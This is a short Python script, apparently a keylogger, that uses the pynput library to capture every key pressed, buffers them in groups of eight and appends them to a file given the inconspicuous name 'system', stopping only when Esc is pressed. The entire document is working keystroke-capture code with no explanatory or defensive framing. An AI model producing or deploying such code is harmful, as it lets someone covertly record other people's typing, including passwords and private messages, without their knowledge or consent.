from pynput.keyboard import Key, Listener

count = 0
keys = []


def onPress(key):
    global keys, count

    keys.append(key)
    count += 1
    if count >= 8:
        count = 0
        writeFile(keys)
        keys = []


def writeFile(keys):
    with open('system', 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def onRelease(key):
    if key == Key.esc:
        return False


with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()
